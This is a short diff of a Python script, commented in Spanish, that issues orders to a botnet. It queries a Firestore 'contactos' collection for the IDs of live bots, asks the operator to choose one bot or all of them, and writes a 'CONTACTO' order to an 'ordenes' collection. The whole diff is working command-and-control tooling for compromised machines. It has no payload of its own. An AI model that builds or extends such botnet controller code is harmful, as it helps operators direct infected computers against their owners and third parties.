@@ -14,8 +14,18 @@ dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
 
 # Escribe una orden para la botnet
 # Escribe una orden para la botnet
-os.system("python3 botsVivos.py")
+lista = []
+docs = firestore_db.collection(u'contactos').where(u'Bot_ID', u'!=', "").stream()
+for doc in docs:
+    if(not(doc.get("Bot_ID") in lista)):
+        lista.append(doc.get("Bot_ID"))
+
+print(lista)
+
 botEscogido = input("Select a bot or leave empty to set a permanent order: ")
 if(botEscogido == ""):
     botEscogido = 'todos'
-firestore_db.collection(u'ordenes').document('contacto ' + dt_string).set({'Primitiva': 'CONTACTO', 'Bot_ID': botEscogido})
+if botEscogido in lista or botEscogido == "todos":
+    firestore_db.collection(u'ordenes').document('contactos ' + dt_string).set({'Primitiva': 'CONTACTO', 'Bot_ID': botEscogido})
+else:
+    print("El bot seleccionado no está disponible")
